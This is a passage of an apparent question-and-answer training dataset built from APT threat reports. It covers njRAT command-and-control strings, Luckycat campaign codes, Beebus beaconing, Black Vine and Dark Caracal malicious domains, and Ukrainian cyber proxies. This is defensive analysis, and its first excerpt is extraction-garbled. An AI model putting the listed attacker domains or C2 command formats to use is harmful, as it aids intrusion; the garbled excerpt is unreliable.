window opened in the Attacker's VM was used to browse to the 'HKLM\\Software\\Microsost\\Windows\\CurrentVersion\\Run' location in the victim system.+1800.652.4020@FidSecSys\nMain network traffic indicator of C2 activity through its \"Registry\" window: \"RG|'|'|~|'|'|\"\nP[endof]P[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\|'|'|HARDWARE|'|'| SAM|'|'|SECURITY|'|'|SOFTWARE|'|'|SYSTEM|'|'|[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\[endof]RG|' |'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\|'|'|7-Zip|'|'|ActiveState|'|'|Adobe|'|'|AT&T Research\nLabs|'|'|C07ft5Y|'|'|Classes|'|'|Clients|'|'|Cygwin|'|'|Gemplus|'|'|Immunity\nInc|'|'|JetBrains|'|'|L&H|'|'|Macromedia|'|'|Microsoft|'|'|MozillaPlugins|'|'|Notepad++|'|'|NSIS_stunnel|'|'|ODBC|'|'|oreas|'|'|P erl|'|'|Policies|'|'|Program Groups|'|'|Python|'|'|Red\nGate|'|'|RegisteredApplications|'|'|RubyInstaller|'|'|Schlumberger|'|'|Secure|'|'|Symantec|'|'|ThinPrint|'|'|VMware, Inc.|'|'|Windows 3.1 Migration Status|'|'|WinPcap|'|'|{167F5D73-87FF-4f15-8EBD-\nC502337D7B34}|'|'|[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\[endof]RG|'|'|~|'|'|HKEY_LOCA L_MACHINE\\SOFTWARE\\Microsoft\\|'|'|.NETFramework|'|'|Active Setup|'|'|AD7Metrics|'|'|ADs|'|'|Advanced INF Setup|'|'|ALG|'|'|ASP.NET|'|'|AudioCompressionManager|'|'|BidInterface|'|'|COM3|'|'|Command\nProcessor|'|'|Conferencing|'|'|Cryptography|'|'|CTF|'|'|DataAccess|'|'|DataFactory|'|'|DevDiv|'|'|DeviceManager|'|'|Dfrg|'|'| Direct3D|'|'|DirectDraw|'|'|DirectInput|'|'|DirectMusic|'|'|DirectPlay|'|'|DirectPlay8|'|'|DirectPlayNATHelp|'|'|DirectX|'|'|Driver\nSigning|'|'|DRM|'|'|DrWatson|'|'|EAPOL|'|'|EnterpriseCertificates|'|'|ESENT|'|'|EventSystem|'|'|Exchange|'|'|Fusion|'|'|HTM LHelp|'|'|IE Setup|'|'|IE4|'|'|Ieak|'|'|IMAPI|'|'|IMEJP|'|'|IMEKR|'|'|IMEMIP|'|'|Intelligent Search|'|'|Internet Account\nManager|'|'|Internet Connection Wizard|'|'|Internet Domains|'|'|Internet Explorer|'|'|IPSec|'|'|Jet|'|'|Machine Debug Manager|'|'|MediaPlayer|'|'|MessengerService|'|'|Microsoft Reference|'|'|MM20|'|'|MMC|'|'|MMCtlsForIE|'|'|Mobile|'|'|Mr. Enigma|'|'|MSBuild|'|'|MSDAIPP|'|'|MSDTC|'|'|MSLicensing|'|'|MSMQ|'|'|MSNInstaller|'|'|MSOSOAP|'|'|MSXML 6.0\nParser and SDK|'|'|MSXML60|'|'|Multimedia|'|'|NET Framework AU|'|'|NET Framework\nSetup|'|'|NetDDE|'|'|NetSh|'|'|NetShow|'|'|Non-Driver Signing|'|'|ODBC|'|'|Office|'|'|Ole|'|'|Outlook\nExpress|'|'|PCHealth|'|'|Ras|'|'|RAS AutoDial|'|'|Remote\nDesktop|'|'|Router|'|'|Rpc|'|'|Schedule+|'|'|SchedulingAgent|'|'|Secure|'|'|Security Center|'|'|Shared|'|'|Shared Tools|'|'|Shared Tools\nLocation|'|'|SmartCard|'|'|Speech|'|'|SQMClient|'|'|SystemCertificates|'|'|Tcpip|'|'|TelnetServer|'|'|Terminal Server Client|'|'|TIP Shared|'|'|Tracing|'|'|Transaction Server|'|'|TShoot|'|'|Tuning Spaces|'|'|Updates|'|'|UPnP Device\nHost|'|'|VBA|'|'|VisualStudio|'|'|WAB|'|'|WBEM|'|'|Web Folders|'|'|Web Service Providers|'|'|Windows|'|'|Windows Imaging\nComponent|'|'|Windows Media Device Manager|'|'|Windows Messaging Subsystem|'|'|Windows NT|'|'|Windows Script Host|'|'|Windows Scripting\nHost|'|'|Wisp|'|'|Works|'|'|WSE|'|'|WZCSVC|'|'|[endof]P[endof]P[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\n\\Microsoft\\Windows\\[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\|'|'|CurrentVersion|'|'| Help|'|'|HTML Help|'|'|ITStorage|'|'|Shell|'|'|Windows Error\nReporting|'|'|[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\[endof]RG|'|' |~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\|'|'|App Management|'|'|App\nPaths|'|'|Applets|'|'|Control Panel|'|'|Controls Folder|'|'|CSCSettings|'|'|DateTime|'|'|Dynamic\nDirectory|'|'|Explorer|'|'|Extensions|'|'|Group Policy|'|'|H323TSP|'|'|Hints|'|'|IME|'|'|Installer|'|'|Internet\nSettings|'|'|IntlRun|'|'|IPConfTSP|'|'|MS-DOS\nEmulation|'|'|Nls|'|'|OptimalLayout|'|'|PhotoPropertyHandler|'|'|policies|'|'|PreviewHandlers|'|'|PropertySystem|'|'|Reinstall |'|'|Reliability|'|'|Run|'|'|RunOnce|'|'|RunOnceEx|'|'|Setup|'|'|SharedDlls|'|'|Shell\nExtensions|'|'|ShellCompatibility|'|'|ShellScrap|'|'|ShellServiceObjectDelayLoad|'|'|SideBySide|'|'|SMDEn|'|'|StillImage|'|'| Syncmgr|'|'|Telephony|'|'|ThemeManager|'|'|Themes|'|'|Uninstall|'|'|URL|'|'|WebCheck|'|'|WindowsUpdate|'|'|DevicePath/\nExpandString/C:\\WINDOWS\\inf|'|'|MediaPathUnexpanded/ExpandString/C:\\WINDOWS\\Media|'|'|SM_GamesName/Stri ng/Games|'|'|SM_ConfigureProgramsName/String/Set Program Access and\nDefaults|'|'|ProgramFilesDir/String/C:\\Program Files|'|'|CommonFilesDir/String/C:\\Program Files\\Common\nFiles|'|'|ProductId/String/76487-018-7438105-\n22214|'|'|WallPaperDir/ExpandString/C:\\WINDOWS\\Web\\Wallpaper|'|'|MediaPath/String/C:\\WINDOWS\\Media|'|'|Progra mFilesPath/ExpandString/C:\\Program\nFiles|'|'|SM_AccessoriesName/String/Accessories|'|'|PF_AccessoriesName/String/Accessories|'|'|[endof]RG|'|'|~|'|'|HKE Y_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHIN\nwww.fidelissecurity.comwww.threatgeek.com+1800.652.4020@FidSecSys\nE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\|'|'|OptionalComponents|'|'|BluetoothAuthenticationAgent/Strin g/rundll32.exe bthprops.cpl,,BluetoothAuthenticationAgent|'|'|VMware Tools/String/\"C:\\Program Files\\VMware\\VMware Tools\\VMwareTray.exe\"|'|'|VMware User Process/String/\"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr|'|'|GhostStartTrayApp/String/C:\\Program Files\\Symantec\\Norton Ghost 2003\\GhostStartTrayApp.exe|'|'|IMJPMIG8.1/String/\"C:\\WINDOWS\\IME\\imjp8_1\\IMJPMIG.EXE\" /Spoil /RemAdvDef /Migration32|'|'|IMEKRMIG6.1/String/C:\\WINDOWS\\ime\\imkr6_1\\IMEKRMIG.EXE|'|'|MSPY2002/String/C:\\WINDOWS\\s ystem32\\IME\\PINTLGNT\\ImScInst.exe /SYNC|'|'|PHIME2002A/String/C:\\WINDOWS\\system32\\IME\\TINTLGNT\\TINTSETP.EXE /IMEName|'|'|Adobe Reader 9.0\\Reader\\Reader_sl.exe\"|'|'|0954e473c171a53f80142346107acfb3/String/\"C:\\Documents and\n/SYNC|'|'|PHIME2002ASync/String/C:\\WINDOWS\\system32\\IME\\TINTLGNT\\TINTSETP.EXE\nSpeed Launcher/String/\"C:\\Program Files\\Adobe\\Reader\nSettings\\Examiner\\Local Settings\\Temp\\ahbornad.exe\" ..|'|'|[endof]P[endof]P[endof]P[endof]P[endof]\n- Keylogger window\nMain network traffic indicator of C2 activity through its \"Keylogger\" window: \"kl|'|'|\"\nkl[endof]kl|'|'|DQoBMTMvMDYvMDYgV0lOV09SRCBEb2N1bWVudDEgLSBNaWNyb3NvZnQgV29yZAENCkhlbGxvIFdv cmxkIQ0KATEzLzA2LzA2IFdJTldPUkQgRG9jdW1lbnQxIC0gTWljcm9zb2Z0IFdvcmQBDQp0ZXN0DQoBMTMvMDYvMD Ygbm90ZXBhZCBVbnRpdGxlZCAtIE5vdGVwYWQBDQpFeHBsb3JlciBwYXNzd29yZDogMTIzNDU1W0JhY2tdNg0KAT EzLzA2LzA2IG5vdGVwYWQgVW50aXRsZWQgLSBOb3RlcGFkAQ0KYXNkZmQ=[endof]P[endof]P[endof]\nThe encoded data sent by the Victim system was the keystrokes collected into the keylogger file in the Victim. The data decodes to:\n- Get Passwords window\no \"ret|'|'|\"\no \"pl|'|'|\"\nMain potential network traffic indicators of C2 activity through its \"Get Passwords\" window:+1800.652.4020\nret|'|'|682dfec8c66a0de6f1475ca73c462a69|'|'|([endof]bla[endof]pl|'|'|682dfec8c66a0de6f1475ca73c462a69|'|'|0[endo f]ret|'|'|682dfec8c66a0de6f1475ca73c462a69|'|'|KiAqICogKiAqICogKiAqICogKiA=[endof]\nAnswer this question: What specific network traffic indicators can be observed when njRAT uses its 'Process Manager' window to interact with processes on the victim system, and how can these indicators be used to identify and respond to an active njRAT infection?",
    "output": "When njRAT uses its 'Process Manager' window, specific network traffic indicators include commands like 'proc|'|'|' for process listing and 'k|'|'|[Process_ID]' for killing a process. For example, the command 'k|'|'|1396' was used to kill the process with ID 1396 (C:\\\\WINDOWS\\\\system32\\\\notepad.exe). Security analysts can identify these indicators by monitoring network traffic for such patterns. By setting up alerts for these specific command structures, they can quickly detect and respond to an active njRAT infection, potentially preventing further damage and lateral movement within the network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: CAMPAIGN CODES\nEach malware attack involves a unique campaign code that can be used to track which systems were compromised by which attack. The campaign codes often contain dates that indicate when each malware attack was launched. This demonstrates how actively and frequently the attackers launched attacks. The campaign codes also reveal the attackers' intent, as some of these referenced the intended targets. The following lists the campaign codes we discovered:\n\u2022 0607e\n\u2022 0609af\n\u2022 0613deliinfo\n\u2022 0613f\n\u2022 0614senior\n\u2022 0616itiT8\n\u2022 0706gggg\n\u2022 0804ggggdatanet1\n\u2022 0805ggggetp\n\u2022 0805ggggstp\n\u2022 0805ecil\n\u2022 0805gggg\n\u2022 0818ICG\n\u2022 0823ggggARDE\n\u2022 0824ggg\n\u2022 0826ggggtnd\n\u2022 1017navydiwali\n\u2022 1017ggg\n\u2022 1025gggCSC\n\u2022 1025gggSC\n\u2022 1090silver89\n\u2022 110228cl\n\u2022 110311cl\n\u2022 110315cl\n\u2022 110315\n\u2022 110321cl\n\u2022 110329\n\u2022 110504\n\u2022 110603p89\n\u2022 110606rg789\n\u2022 110616np\n\u2022 110705hktq\n\u2022 110706gggg\n\u2022 110706hal\n\u2022 110705hktq\n\u2022 110708hktqw\n\u2022 110711gggg\n\u2022 110711hal\n\u2022 110711xzg\n\u2022 110713jp\n\u2022 110714jdap\n\u2022 110714tp\n\u2022 110715x\n\u2022 110718p\n\u2022 110816h\n\u2022 110824p\n\u2022 1108navyeast\n\u2022 1108vpsecretary\n\u2022 111031pp\n\u2022 1110mea\n\u2022 1114round\n\u2022 1122bol\n\u2022 1122gmail\n\u2022 1122other\n\u2022 11421is9\n\u2022 1145j9yb\n\u2022 1147s9\n\u2022 1148dq8\n\u2022 11614lmpn\n\u2022 11725imp\n\u2022 11727p\n\u2022 1229\n\u2022 2012\n\u2022 214\n\u2022 28\n\u2022 64sc109pfye\n\u2022 64sc239pf9010\n\u2022 720halheli\n\u2022 729ggggsenior\n\u2022 919ggggstp\n\u2022 ggggstpdomainserver\n\u2022 dang279wrdye\n\u2022 god\n\u2022 gop\n\u2022 ishan99dfp\n\u2022 j1141ap99\n\u2022 j4611dq9\n\u2022 kondulgml27pfye\n\u2022 longjiao\n\u2022 luck\n\u2022 LY\n\u2022 nec3rd79dfp\n\u2022 nfounrsvan99uc\n\u2022 nne\n\u2022 ongs239pfye\n\u2022 sai\n\u2022 stmlsp211wd\n\u2022 w1229\n\u2022 wwwroot\n\u2022 zz1227\nBig Headline: COMMAND AND CONTROL\nThe Luckycat campaign extensively use free hosting services. We recorded the domains the attackers used as well as the email addresses they utilized to register the domains, if available. While the domains, including their suffixes, were considerably diverse, all were available from three different free hosting services. As such, the attackers had nothing to lose but time in order to continue creating diverse domain names for C&C servers.\nThe attackers also maintain servers that do not appear to be from free web-hosting service providers. In fact, these appear to use dedicated VPS services.\nWe also found advertisements for VPS services using two of the C&C server IP addresses in Table 3. While the VPS services were advertised in Chinese forums, the servers were actually hosted in the United States.\nThe diversity of C&C hosting services used provided the attackers a resilient infrastructure. If one server, for instance, was shut down for malicious activity, they can easily create more servers. As victims of interest are identified, they can also be easily moved from free hosting servers to C&C servers set up on more stable VPSs. The domain and geographic diversity of the IP addresses also helped mask the attackers' locations.\n\nQ: How did the campaign codes used in the Luckycat campaign help in understanding the attackers' strategies and intentions?",
    "output": "A: The campaign codes used in the Luckycat campaign contained dates that indicated when each malware attack was launched, demonstrating the frequency and active nature of the attacks. Additionally, some campaign codes referenced the intended targets, revealing the attackers' intent. For example, codes like '0614senior', '1017navydiwali', and '1108navyeast' suggest specific targets or objectives. This information helps in understanding the attackers' strategies and the scope of their operations, allowing defenders to better prepare and respond to similar threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Longhorn APT group employ data obfuscation techniques to evade detection in their command and control communications?",
    "output": "Data obfuscation is a technique used by adversaries to make command and control traffic more difficult to detect. In the case of the Longhorn APT group, they employ various data obfuscation techniques to evade detection. According to the analysis, Longhorn's malware communicates with C&C servers over HTTPS using a custom underlying cryptographic protocol to protect communications from identification. Additionally, the group uses in-memory string de-obfuscation and employs wipe-on-use as standard practice, which are both indicative of data obfuscation techniques. Furthermore, the use of a unique deployment-time key for string obfuscation and the employment of secure erase protocols involving renaming and overwriting also suggest that Longhorn is attempting to conceal their C&C communications. These techniques, combined with the use of legitimate protocols and encryption, make it challenging to detect Longhorn's malicious activities. Therefore, it is evident that Longhorn employs data obfuscation techniques to evade detection and maintain stealth in their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: \ue023\ue0aa\ue08d\ue084\ue07c\ue0c6\ue093\ue0af\ue0aa\ue03b\ue060\ue084\ue07c\ue0c6\ue0af\ue0bc\nWe have seen this campaign use both email and drive\u00adby downloads as a means of infecting end users. The threat actor has consistently used attachment names of documents/white papers released by well\u00adknown companies. The malicious email attachment exploits some common vulnerabilities in PDF and DOC files.\nThe\nmalware uses a well\u00addocumented vulnerability in the Windows OS known as DLL search order hijacking. There is an order in which executables load DLLs on the Windows operating system. This particular malware takes advantage of this vulnerability and drops a DLL called ntshrui.DLL in the C:\\Windows directory. The first place from where the executable looks to load the DLL is its own directory. By dropping the ntshrui.DLL in the directory C:\\Windows, the malware achieves persistence.\nFigures 1 and 2 below show the modified weaponized PDF, which was used in the spear phishing attack. The PDF on the left is the non\u00admalicious version, while the one on the right is malicious. As you can see from the pictures below, the original PDF was modified using the Ghostscript tool. Also the size of the malicious PDF is significantly smaller than the non\u00admalicious version.\nThe malware communicates with a remote command and control (CnC) server. The GET request in Figure 4 is the initial request that the compromised machine makes to \"check in\" with the CnC server. The keyword \"p=2,\" which is sent out as part of the URI, appears to indicate the version of the malware. Mining our database we found three versions of this malware and they are noted in the table below. The version value is hard\u00adcoded in the ntshrui.DLL file in the samples we observed.\nIt encrypts information it collects with the base64 algorithm and then sends it to the remote CnC server as seen in Figure 4. It is interesting to note that the base64 data is subjected to some substitutions before it is sent out preventing run of the mill inspection on the wire. It replaces the '/' (forward slash) and '+' (plus) characters which are part of the base64 character set with '_' (underscore) and '\u00ad' (hyphen) respectively. The code that performs this operation is shown in Figure 5.\nA sample of the data that is encrypted and sent to the CnC server for version 'p=2' is seen in the memory dump shown in Figure 6. At offset 4\u00ad7 it contains a time\u00adbased counter. It uses the keyword \"osamu\" in this instance to identify this particular campaign. The campaign keywords are not sent out in version 'p=1' but can still be found hardcoded in the DLL payload. The hostname and OS information are also included in the beacon. It awaits further commands from the CnC server in response to the data sent out.\nIt has modules to capture system information (processor, disk, memory, OS), process id, process start time, and current user information. It also contains a module to download and execute additional payloads and updates. It downloads in to %TEMP% directory and calls CreateProcessA to invoke execution as seen below:\nThe POST request looks very similar to the GET request and uses base64 encoding to encode the URI.\nHTTP/1.1\nUser\u00adAgent: Mozilla/4.0 (compatible; )\nAccept: */*\nHost:\nContent\u00adLength: 563\nConnection: Keep\u00adAlive\nCache\u00adControl: no\u00adcache\nThe malware collects the following information from the compromised machine.\n1) Type of Processor\n2) CPU Speed\n3) Figures out the product type by querying the \\SYSTEM\\CurrentControlSet\\Control\\ProductOptions\\ProductType registry key.\n4) Memory Usage\nThe malware is fairly noisy sending multiple GET requests. In our test environment we observed that the POST request started a couple of hours after the malware initially checked in with the CnC. Around the same time we also noticed a new exe get dropped under \"C:\\Documents And Settings\\Administrator\\Local Setting\\Temp~ISUN32.exe\". The two figures below show the ISUN32.exe process start up and the exe get dropped under TEMP directory.\nWe4/10/2016have a full list which summarizes the attachment names, campaign codes, and campaign duration of this particular operation. The table also includes the md5sum of the malware payloads. Below is a subset of attachment names that we have observed. We are willing to share additional information with the security community. Please contact research at fireeye dot com for more information.\nsensor environments.doc\nGlobal_A&D_outlook_2012.pdf\nFY2013_Budget_Request .doc\nUnderstand your blood test report.pdf\nRHT_SalaryGuide_2012.pdf\nSecurity Predictions for 2012 and 2013.pdf\nApril Is the Cruelest Month.pdf\nNational Human Rights Action Plan of China (2012\u00ad2015).pdf\nDept of Defense FY12 A STTR Solicitation Topics of Interest to Boeing.pdf\nBoeing_Current_Market_Outlook_2011_to_2030.pdf\nRHT_SalaryGuide_2012.pdf\ndodd\u00adfrank\u00adconflict\u00adminerals.doc\nConflict\u00adMinerals\u00adOverview\u00adfor\u00adKPMG.doc\n\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c.doc\nTimeline of the Beebus Campaign\nFrom the timeline below, we were able to figure out that this campaign has been targeting companies in the Aerospace and Defense vertical in waves. There is no specific pattern to this attack, we have seen days on which multiple weaponized emails were sent to several companies, and on other days we observed that the threat actor sent only one email to a specific target organization. The chart below shows Beebus attacks in the last year.\n\nAnswer this question based on the above context: How does the malware in Operation Beebus communicate with its command and control (CnC) server, and what kind of information does it send? Describe the encryption method used and any notable modifications to the encoded data.",
    "output": "The malware communicates with a remote command and control (CnC) server using HTTP requests. It sends an initial GET request to 'check in' with the CnC server, including a keyword 'p=2' to indicate the version of the malware. The malware encrypts the information it collects using the base64 algorithm before sending it to the CnC server. Notably, the base64 data is subjected to substitutions where the '/' (forward slash) and '+' (plus) characters are replaced with '_' (underscore) and '\u00ad' (hyphen) respectively. This prevents straightforward inspection on the wire. The encrypted data includes a time-based counter, a campaign keyword ('osamu'), hostname, and OS information. The malware awaits further commands from the CnC server in response to the data sent out.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nBlack Vine has been conducting its attacks since at least 2012. Many of the campaigns analyzed by Symantec have been targeted attacks against the energy, aerospace, healthcare, and other industries. Black Vine used three variants of malware throughout the years known as Hurix, Sakurel, and Mivast. All three variants originated from one malware family that was likely created and updated by the same author or developer. Each variant has been updated to add features and is re-hashed to avoid detection.\nIn a number of attacks, the malware has been delivered onto the victim's computer after Black Vine has exploited a zero-day vulnerability primarily through watering-hole attacks. The zero-day exploits used in these attacks are believed to have been distributed through the Elderwood distribution framework. Additionally, the goal of all analyzed Black Vine campaigns has been cyberespionage.\nThe Anthem attack is one the most publicized and damaging attacks against the US health industry.  However, the healthcare industry is only one of several large cyberespionage-based campaigns conducted by Black Vine. As outlined in the findings of our investigation, Black Vine has also attacked the aerospace and energy industries. By investigating and documenting the TTPs, malware, targets, and exploits used in these attacks over time, Symantec hopes to shed light on the history of the Black Vine attack group.\nSymantec's goal in creating this report is to provide an assessment of this attack group to help organizations better understand the attackers and their motivations. Knowing the signs to identify Black Vine's activity will help analysts build better defenses and allow decision-makers to react to Black Vine attacks more effectively.\nMedium Headline: Black Vine domains\nThe following domains have been associated with Black Vine activity:\n\u2022 ameteksen.com\n\u2022 asconline.we11point.com\n\u2022 assso.net\n\u2022 capstoneturbine.cechire.com.\n\u2022 caref1rst.com\n\u2022 careflrst.com\n\u2022 EmpireB1ue.com\n\u2022 extcitrix.we11point.com\n\u2022 facefuture.us\n\u2022 gifas.blogsite.org\n\u2022 gifas.cechire.com\n\u2022 healthslie.com\n\u2022 hrsolutions.we11point.com\n\u2022 icbcqsz.com\n\u2022 me.we11point.com\n\u2022 mycitrix.we11point.com\n\u2022 myhr.we11point.com\n\u2022 oa.ameteksen.com\n\u2022 oa.ameteksen.com\n\u2022 oa.technical-requre.com\n\u2022 oa.trustneser.com\n\u2022 polarroute.com\n\u2022 prennera.com\n\u2022 savmpet.com\n\u2022 sharepoint-vaeit.com\n\u2022 sinmoung.com\n\u2022 ssl-vaeit.com\n\u2022 ssl-vait.com\n\u2022 topsec2014.com\n\u2022 vipreclod.com\n\u2022 vpn.we11point.com\n\u2022 we11point.com\n\u2022 webmail.kaspersyk.com\n\u2022 webmail.vipreclod.com.\n\u2022 wiki-vaeit.com\n\u2022 www.we11point.com\n\u2022 ysims.com\n\nHow did Black Vine deliver their malware onto victims' computers, and what specific framework was used to distribute the zero-day exploits?",
    "output": "A: Black Vine delivered their malware onto victims' computers primarily through watering-hole attacks, where they exploited zero-day vulnerabilities. The zero-day exploits used in these attacks were distributed through the Elderwood distribution framework.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: 1 Introduction\nIn July 2015, I travelled to Kyiv to investigate the role of cyber proxy actors as part of a long-term, global research project on the issue. The Ukrainian crisis seemed like the perfect case study to explore how states use non-state actors and their capabilities. The findings confirmed some of my assumptions but also revealed some surprises. This article outlines what I learned during the trip based on interviews with 11 individuals including current and former government officials, private sector representatives, security researchers, and Eugene Dokukin, the 'commander' of the Ukrainian Cyber Forces, in addition to a review of existing literature.1\nTo start, the crisis in Ukraine has several ingredients that appear to make the use of proxies by a state likely, namely (1) an ongoing hot conflict, fuelling (2) incentives for the state to use proxy capabilities and (3) significant capabilities residing outside of but available to the state. With regard to the second, this includes the general political incentive to be able to claim plausible deniability as well as incentives for the state to augment its own capabilities by adding those provided by non-state actors.\nIt is also helpful to distinguish between two dimensions when analysing proxy actors to ensure greater analytical clarity. First, analysing proxy actors is part of the broader academic inquiry into the governance of violence best described by the title\nof Deborah Avant's seminal book The Market for Force \u2013 The Consequences of Privatizing Security. In that book, Avant investigates the market for force and the role of public and private actors including proxies.2 The second, narrower dimension focuses on proxy actors used 'to commit internationally wrongful acts using ICTs'. 3 This is the language used in the most recent report of the Group of Governmental Experts (GGE) that is leading the international community's global cybersecurity norms effort under the auspices of the United Nations. Unlike the first dimension which examines proxy actors more broadly including those that are used by states for defensive purposes, this second lens is about proxy actors used to cause harm to another party.\n1 'Cyber warrior steps up effort to help in war with Russia,' KyivPost, February 10, 2015, (<http://www.kyivpost.com/content/kyiv-post-plus/cyber-warrior-steps-up-effort-to-help-in-war-with-russia-380184.html?flavour=mobile>)http://www.kyivpost.com/content/kyiv-(<http://www.kyivpost.com/content/kyiv-post-plus/cyber-warrior-steps-up-effort-to-help-in-war-with-russia-380184.html?flavour=mobile>)post-plus/cyber-warrior-steps-up-effort-to-help-in-war-with-russia-380184.html?flavour=mobile.\nThis short chapter will look at both private actors involved in the general provision of security for the benefit of the state, and private actors using force against a third party to the benefit of the state, but will focus on the latter. The first section outlines in greater detail the conditions present in the region assumed to contribute to the existence of proxy actors. The second part describes the proxy actors that are publicly known to have been active during the crisis.\nSmall Headline: 2 The Making of a Hot Conflict\nLong before Yanukovych's flight, Russian hacker groups were executing DDoS attacks and defacing websites.\nThe hot conflict between Ukraine and Russia was the result of simmering political tension that escalated in November 2013, when former Ukrainian president Viktor Yanu-kovych abandoned plans to sign a trade agreement with the EU. Yanukovych's decision incited mass protests that were met with a violent government crackdown. In November, long before Yanukovych's flight in February and the build-up of Russian troops on the Crimean border, reports emerged that Russian hacker groups were executing Distributed Denial of Service (DDoS) attacks and defacing websites critical to the Yanukovych government's relationship with Russia. This period was characterised by low-level hacking targeting highly visible websites, either rendering them unavailable or changing their content.\nOn February 28, shortly after Yanukovych left the country, unmarked soldiers, that Russia's President Putin later acknowledged4 to be Russian troops, seized a military airfield in Sevastopol and Simferopol international airport. Concurrently, armed sol-\ndiers tampered with fibre optic cables, raiding the facilities of Ukrainian telecom firm Ukrtelecom, which stated afterward that it had 'lost the technical capacity to provide connection between the peninsula and the rest of Ukraine and probably across the peninsula, too'. 5 In addition, cell phones of Ukrainian parliamentarians were hacked and the main Ukrainian government website was shut down for 72 hours after Russian troops entered Crimea on March 2. Patriotic Ukrainian hacker groups such as 'Cyber Hundred' and 'Null Sector' retaliated with DDoS attacks of their own against websites of the Kremlin and the Central Bank of Russia.6 The day before the presidential election, Ukraine's Security Service (SBU) discovered malware in the systems of the Central Election Commission designed to compromise data collected on the results of the election, revealing how close Russian hackers had come to sabotaging the results.7 The hacker group 'Cyber Berkut' claimed responsibility.8\n2 'The Market for Force The Consequences of Privatizing Security,' Cambridge University Press, 2005, (<http://www.cambridge.org/US/academic/subjects/politics-international-relations/comparative-politics/market-force-consequences-privatizing-security>)http://www.cambridge. (<http://www.cambridge.org/US/academic/subjects/politics-international-relations/comparative-politics/market-force-consequences-privatizing-security>)org/US/academic/subjects/politics-international-relations/comparative-politics/market-force-consequences-privatizing-se-(<http://www.cambridge.org/US/academic/subjects/politics-international-relations/comparative-politics/market-force-consequences-privatizing-security>)curity.\n3 United Nations, General Assembly, Report of the Group of Governmental Experts on Developments in the Field of Information and Telecommunications in the Context of International Security,United Nations, July 22, 2015, (<http://www.un.org/ga/search/view_doc.asp?symbol=A/70/174>)http://www.un.org/ga/search/ (<http://www.un.org/ga/search/view_doc.asp?symbol=A/70/174>)view_doc.asp?symbol=A/70/174.\n4 'Vladimir Putin admits for first time Russian troops took over Crimea, refuses to rule out intervention in Donetsk,' National Post, April 17, 2014, (<http://news.nationalpost.com/news/world/vladimir-putin-admits-for-first-time-russian-troops-took-over-crimea-refuses-to-rule-out-intervention-in-donetsk>)http://news.nationalpost.com/news/world/vladimir-putin-admits-for-first-time-russian-troops-took-(<http://news.nationalpost.com/news/world/vladimir-putin-admits-for-first-time-russian-troops-took-over-crimea-refuses-to-rule-out-intervention-in-donetsk>)over-crimea-refuses-to-rule-out-intervention-in-donetsk.\n\nWhat specific cyber incidents occurred immediately after Yanukovych left the country, and how did Ukrainian hacker groups respond?",
    "output": "After Yanukovych left the country, unmarked Russian troops seized a military airfield in Sevastopol and Simferopol international airport. Concurrently, armed soldiers tampered with fibre optic cables, raiding the facilities of Ukrainian telecom firm Ukrtelecom, which lost the technical capacity to provide connections between the peninsula and the rest of Ukraine. Additionally, cell phones of Ukrainian parliamentarians were hacked, and the main Ukrainian government website was shut down for 72 hours after Russian troops entered Crimea on March 2. In response, patriotic Ukrainian hacker groups such as 'Cyber Hundred' and 'Null Sector' retaliated with DDoS attacks against websites of the Kremlin and the Central Bank of Russia.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Dark Caracal APT group use Masquerading in their infrastructure to evade detection and deceive users?",
    "output": "Masquerading is a technique used by adversaries to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. In the case of the Dark Caracal APT group, they employed Masquerading in their infrastructure to evade detection and deceive users. One example of this is the use of a fake Android App Store, hosted on the domain adobeair[.]net, which masqueraded as a legitimate app store but actually delivered malware to infected devices. Additionally, the group used phishing domains, such as tweetsfb[.]com, that were designed to look like legitimate Facebook and Twitter login portals, but were actually used to steal user credentials. The group also used bulletproof hosting providers, such as Shinjiru, which allowed them to host their malicious infrastructure without being easily detected. Furthermore, the group used fake personas, such as 'Nancy Razzouk', to register domains and sign malware, making it harder to track their activities. Overall, the Dark Caracal APT group's use of Masquerading techniques allowed them to maintain a sophisticated and stealthy operation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Butterfly Group/ Morpho\nThe Butterfly group performs corporate espionage campaigns against organizations containing proprietary intellectual property. Stolen information is likely sold for fiscal gain. The Butterfly group is organized and efficient. It is likely that the group consists of only a few individuals (~3-10 members). According to Symantec, \"[t]here are some indications that this group may be made up of native English speakers, are familiar with Western culture, and may operate from an Eastern Standard Time (EST) time zone.\" The emergence of the Butterfly group should remind organizations that corporate espionage groups and non-state sponsored APTs still exist. In fact, in certain aspects, they are more dangerous than state sponsored groups. Mercenary and espionage groups may possess specific knowledge of what information to steal or from what systems to steal data. This information may come from competitors or it may come from insider threats within the organization. APTs, like the Butterfly group, are more likely to profit from exfiltrated data and stolen intellectual property than an enemy nation state might. Auction of stolen information to a third party will 